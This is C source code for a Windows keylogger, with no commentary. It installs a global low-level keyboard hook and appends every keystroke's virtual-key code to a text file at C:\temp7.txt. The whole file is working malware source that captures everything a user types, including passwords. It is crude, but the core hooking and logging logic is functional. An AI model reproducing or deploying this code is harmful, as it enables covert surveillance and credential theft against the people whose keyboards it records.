#include <Windows.h>
#include <stdio.h>

HHOOK hHook;
PCWSTR path = L"C:\\temp7.txt";
HANDLE hFile;
LRESULT CALLBACK keylogger(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
	char vk = (char)p->vkCode;
	HANDLE hFile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, &vk, sizeof(vk), NULL, NULL);
	CloseHandle(hFile);
	LRESULT returnedValue = CallNextHookEx(hHook, nCode, wParam, lParam);
	return returnedValue;
}

int main() {
	HANDLE hFile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(hFile);
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keylogger, NULL, 0);

	
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 1;
}